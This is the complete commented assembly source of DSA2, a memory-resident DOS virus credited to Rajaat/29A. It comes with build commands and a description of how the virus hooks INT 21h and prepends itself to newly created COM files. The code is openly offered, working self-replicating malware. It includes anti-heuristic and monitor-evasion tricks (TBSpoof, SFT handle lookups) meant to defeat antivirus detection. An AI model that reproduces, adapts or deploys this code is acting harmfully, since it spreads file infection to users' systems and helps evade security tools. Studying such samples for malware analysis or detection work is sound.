   ;=====( DSA2 Virus by Rajaat / 29A )===========================================
   ;
   ; Virus name    : DSA2
   ; Author        : Rajaat / 29A
   ; Origin        : United Kingdom, December 1997
   ; Compiling     : Using TASM
   ;
   ;                 TASM /M DSA2
   ;                 TLINK /T DSA2
   ; Targets       : COM files
   ; Size          : 245 bytes
   ; Resident      : Yes, doesn't decrease memory
   ; Polymorphic   : No
   ; Encrypted     : No
   ; Stealth       : No
   ; Tunneling     : Uses SFT to avoid some monitors
   ; Retrovirus    : No
   ; Antiheuristics: Only TBSpoof
   ; Peculiarities : It won't get far
   ; Drawbacks     : Don't write me, I know all of them ;-)
   ; Behaviour     : When an infected COM file is executed, the virus will
   ;                 go resident in the stack reserved for dos INT 21
   ;                 functions <0ch and hook INT 21. There will be no
   ;                 visible decrease in conventional memory. The virus
   ;                 will then pass control to the host by shifting the
   ;                 whole host back over the virus code (this virus is
   ;                 prepending). From now, every COM file of 0 bytes in
   ;                 length that is written to (except for misnamed EXE
   ;                 files) will get infected. If a write is done, DSA2
   ;                 check wether the current filesize is 0, the file
   ;                 handle does not belong to a device, the amount of
   ;                 which will be written is not too big or too small and
   ;                 last but not least wether it is already infected or
   ;                 not. If all requirements are met, DSA2 will write
   ;                 itself to the file and then let the original write
   ;                 proceed. This makes DSA2 a slow infector and doesn't
   ;                 need a critical error handler.
   ;
   ;                 It's unknown what this virus might do besides replicate :)
   ;
   ;                 Well, actually this virus is a little combination of
   ;                 two other viruses that are both written by me,
   ;                 Andropinis and DSA. The virus will use some tricks to
   ;                 make it tough to av programs to detect the virus and
   ;                 to remove it heuristically. There is no decrease in
   ;                 conventional memory and it isn't very noticeable.
   ;                 Unfortunately there are not many COM files in use now
   ;                 anymore, but that's how the cookie crumbles.
   ;
   ;                 Thanks to Sandy for lashing me to work and comment
   ;                 this virus, and the rest for supporting me.
   ;
   ;                 As a side note, I want to dedicate this virus to a
   ;                 friend of mine who had some very traumatic experience
   ;                 with a car and a dog. I wish him luck and I hope he
   ;                 recovers soon enough and can leave the mental
   ;                 institute again.... Naaaah just kidding :*)
   ;
   ;                 UK != OK
   ;
   ;=====( Start of code )========================================================

   .model tiny                             ; tiny tidy shitty whatever
   .code                                   ; what I always wanted to do
   .radix 16                               ; I think in HEX
   .286                                    ; I am tired of XT weenies. spend some
                                           ; money and buy a REAL machine

                   org 100                 ; com offset

   main:           push ax                 ; TBSpoof (not for newer versions)
                   dec bx

                   cld                     ; clear direction bit (wow!)

                   lea bx,main             ; Squeeze doggy.. eehhh entrypoint on
                   push bx                 ; the stack


   ;=====( Some wise words from Ralph Brown )=====================================
   ; INT 21 U - DOS 3.0+ internal - GET ADDRESS OF DOS SWAPPABLE DATA AREA
   ; AX = 5D06h
   ; Return:
   ; CF set on error         AX = error code (see #1020)
   ; CF clear if successful  DS:SI -> nonreentrant data area (includes all three D
   ;                                  DOS stacks) (critical error flag is first
   ;                                  byte) (see #1027)
   ;                         CX = size in bytes of area which must be swapped
   ;                              while in DOS
   ;                         DX = size in bytes of area which must always be
   ;                              swapped
   ;=====( Thank you sir! )=======================================================

                   mov ax,5d06             ; see above piece
                   int 21

                   xchg ax,si              ; swap si to ax
                   test al,0f              ; is it paragraph aligned? (should be)
                   jnz is_resident         ; no, bummer, we are resident :-)

                   shr ax,4                ; convert it to segment address
                   add al,50               ; add paragraphs to stack - 10h
                   mov di,ds               ;
                   add ax,di               ; add ds to the converted paragraphs
                   push cs                 ;
                   pop ds                  ; I like Snoop Doggy Dog $-)
                   mov es,ax               ;

                   cmp word ptr es:[bx],'KP' ; are we there yet?
                   jz is_resident            ; yes, bailout time

                   mov si,bx               ; get start address of virus
                   mov di,bx               ; in both source and destination

                   mov cx,virus_size       ; and move the virus to the dos
                   rep movsb               ; stack

                   push es                 ; whoop, some segment juggling here
                   pop ds                  ; for my ease

                   mov ax,3521             ; now where did I put that int 21h
                   int 21                  ; vector to? let's kindly ask DOS to
                   mov word ptr int_21,bx  ; provide that for me, and store it
                   mov word ptr int_21+2,es; into my memory

                   mov ah,25               ; in order to be able to replicate, the
                   lea dx,new_21           ; virus hooks int 21h itself
                   int 21                  ;

   ;=====( Return to host handler )===============================================

   is_resident:    pop di                  ; this was the pushed bx register &^)
                   pop ax                  ; this was the pushed ax register @:-)
                   push cs                 ; clean some segment registers by
                   push cs                 ; setting them to the code segment
                   pop ds                  ; again...
                   pop es                  ;
                   push 0c3a4              ; now this is what makes this puppy a
                   push 0f357              ; bit special, it pushes a rep movsb
                   push sp                 ; and a ret on the stack and the stack
                   lea si,virus_end        ; its own address and then jumps to the
                   mov cx,5                ; stack, which shifts the complete host
   host_size       equ $-2                 ; down and then returns to 100h
                   ret

                   db '[DSA2]'             ; I could have called it DogCrusher,
                   db '[Rajaat/29A]'       ; but I don't wanna hurt Jqwerty his
                                           ; feelings >8-)

   ;=====( Resident handler of the virus )========================================

   new_21:         cmp ah,40               ; is it a write action?
                   je write_to_file        ; yea, let's go check it out

   eoi_21:         jmp dword ptr cs:[int_21] ; thank you, drive through

   write_to_file:  push ax                 ; i don't want to spoil these registers
                   push bx                 ; so I push them on the stack.
                   push dx                 ;
                   push di                 ; http://www.europa.com/~dogman
                   push es                 ; hahahahahaha

                   mov ax,4400             ; check if the file belongs to a device
                   int 21                  ; or not....
                   test dl,80              ;
                   jnz not_suitable        ; if so, it's not for use.

                   mov ax,1220             ; get the file handle table for the
                   int 2f                  ; file handle that is now in bx
                   mov bl,byte ptr es:[di] ;
                   mov ax,1216             ; jq performs it doggy style ;-)
                   int 2f                  ;

                   mov bx,2020                ; now we gonna check if the file has
                   mov ax,word ptr es:[di+28] ; a com extension. if it hasn't it
                   or ax,bx                   ; is bailout time again.
                   cmp ax,'oc'                ;
                   jne not_suitable           ; doesn't start with "co"
                   mov al,byte ptr es:[di+2a] ;
                   or al,bl                   ;
                   cmp al,'m'                 ; doesn't end with "m"
                   jne not_suitable           ;

                   cmp word ptr es:[di+11],0  ; if the current file length is 0,
                   jne not_suitable           ; the file has just been created,
                                              ; which is great, since this virus
                                              ; is a great slow infector

                   cmp cx,1000             ; if the file is too small for our
                   jb not_suitable         ; liking, it's bailout time again
                   cmp cx,0f000            ; and if the file is too large we quit
                   jbe check_exe           ; too, otherwise we jump to check_exe

   not_suitable:   pop es                  ; get the wasted register again from
                   pop di                  ; the stack we put them on some lines
                   pop dx                  ; above here.
   is_renamed_exe: pop bx                  ;
                   pop ax                  ;
                   jmp eoi_21              ; and chain to the old interrupt 21h

   check_exe:      pop es                  ; get some registers we need
                   pop di                  ;
                   pop dx                  ;

                   mov bx,dx                 ; does the write contain an exe
                   cmp word ptr ds:[bx],'ZM' ; header?
                   je is_renamed_exe         ; if so, we leave here.

                   cmp word ptr ds:[bx],'KP' ; is it already infected?
                   je is_renamed_exe         ; yes, we leave again (are we exe?
                                             ; no but i hate multiple
                                             ; references)

   ;=====( Actual infection routine - very simplistic )============================

   infect_com:     pop bx                  ; get filehandle from stack
                   push bx                 ;

                   push cx                 ; same some values we need (length we
                   push dx                 ; wanted to write, and offset)
                   push ds                 ;

                   push cs                    ; write our own code before the
                   pop ds                     ; file as some extra attachment.
                   mov word ptr host_size,cx  ; so we actually didn't have to
                   mov ah,40                  ; open and close the file ourselves.
                   mov cx,virus_size          ; this saves a lot of time, we don't
                   lea dx,main                ; need an error handler.
                   pushf                      ;
                   call dword ptr cs:[int_21] ;

                   pop ds                  ; pop some registers
                   pop dx                  ;
                   pop cx                  ;
                   jmp is_renamed_exe      ; and we are done

   int_21          dd 0                    ; here we store the original int 21h

   virus_end       equ $                   ; end of virus ofcourse
   virus_size      equ virus_end-main      ; the size of the virus

   ;=====( Host file )============================================================

                   mov ax,4c00             ; exit to dos with exit code
                   int 21                  ; this is actually a carrier host

   end main                                ; curtains fall... :-0

   ;=====( This is the the end, the very end, make the best of it, and goodbye )==
